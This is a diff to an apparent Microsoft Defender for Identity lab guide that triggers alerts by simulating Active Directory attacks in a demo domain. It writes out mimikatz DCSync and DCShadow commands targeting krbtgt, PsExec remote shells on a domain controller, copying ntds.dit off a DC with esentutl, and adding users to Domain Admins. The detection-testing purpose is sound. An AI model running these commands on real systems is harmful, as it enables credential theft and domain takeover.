@@ -287,7 +287,7 @@ Detail in the alert:
 If an attacker has the "DS-Replication-Get-Changes-All" permission for example, he can initiate a replication request to retrieve the data stored in Active Directory such as the krbtgt's password hash.  
 In this detection, an alert is triggered when a replication request is initiated from a computer that isn't a DC.  
 
-From a command line run :  
+From a command line run with a least local admin account :  
 
 *mimikatz # privilege::debug*  
 *mimikatz # lsadump::dcsync /domain:msdemo.local /user:krbtgt*  => to retrieve the krbtgt's password hash and move to a golden ticket attack
@@ -305,7 +305,7 @@ In the alert Compay Segundo failed to retrieve the DCsync (not enough permission
 ## 16 - Suspected DCShadow attack (domain controller promotion) & (domain controller replication request)
 Two alerts are available but let's focus only on the "Domain controller replication request" alert; in this scenario, attackers strive to initiate a malicious replication request, allowing them to change Active Directory objects on a genuine DC, which can give the attackers persistence in the domain.
 
-From a command line run with AD admin permissions :  
+From a command line run with AD admin account :  
 
 *mimikatz # privilege::debug*  
 *mimikatz # lsadump::dcshadow /object:krbtgt /attribute=ntPwdHistory /value:0000000000*  
@@ -320,15 +320,58 @@ Detail in the alert :
 ## 17 - Remote code execution attempts  
 MDI detects PSexec, Remote WMI, and PowerShell connections from a client machine to a DC. Attackers can execute remote commands on your DC or AD FS server to create persistence, collect cata or perform a denial of service (DOS).
 
-From a command line run with AD admin permissions :  
+From a command line run with AD admin account :  
 
 *PSExec.exe -s -i \\msdemo-dc01 powershell.exe*  => to start a PowerShell session on DC
+
+Tools available from : https://docs.microsoft.com/en-us/sysinternals/downloads/
 
 Detail in the alert :  
 
 ![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image30.png) 
 
-## 18 - 
+## 18 - Data exfiltration over SMB
+This alert is triggered when suspicious transfers of data are observed from your monitored DCs, such as when an attacker copies the ntds.dit file from a DC to a workstation.
+
+From a command line run with AD admin account :  
+*PSEexec -s -i \\msdemo-DC01 cmd.exe* => to get a cmd session on a DC  
+*Esentutl /y /i c:\windows\ntds\ntds.dit /d c:\windows\ntds.dit* => to get a copy of the ntds.dit file for an exfiltration  
+*copy c:ntds.dit to z:* => copy the ntds.dit file from the DC to your workstation (Z:)  
+
+Tools available from : https://docs.microsoft.com/en-us/sysinternals/downloads/  
+
+Detail in the alert :  
+
+![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image31.png) 
+
+Keep in mind that MDI can also track files uploaded from workstation or server to a DC; this can be useful to detect abnormal activities (see https://github.com/DanielpFR/MDI/#tips-3--list-of-files-copied-from-a-client-to-dcs-over-the-last-30-days). You should see this type of activities from the user timeline :  
+
+![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image32.png)  
+
+## 19 - Suspected Golden Ticket usage (nonexistent account) & (Time anomaly) & (encryption downgrade) etc..
+MDI can detect 6 types of Golden Ticket attack; let see 3 of them. 
+
+
+## 20 - Suspicious additions to sensitive groups
+Attackers could add users to highly privileged groups to gain access to more resources, and gain persistency. This alert needs a machine learning period (such as : this user usually does not perform this addition to sensitive groups...etc).
+
+From a workstation with RSAT start with an AD admin account:  
+
+*dsa.msc*  => and add a user to a sensitive groups such as Enterprise Admins or Domain Admins  
+
+Tools available from : https://www.microsoft.com/en-us/download/details.aspx?id=45520  
+
+You should see the activities and the alert in the user timeline :  
+
+![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image33.png)  
+
+Detail in the alert:  
+
+![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image34.png)  
+
+## 21 - 
+
+
 
 
 
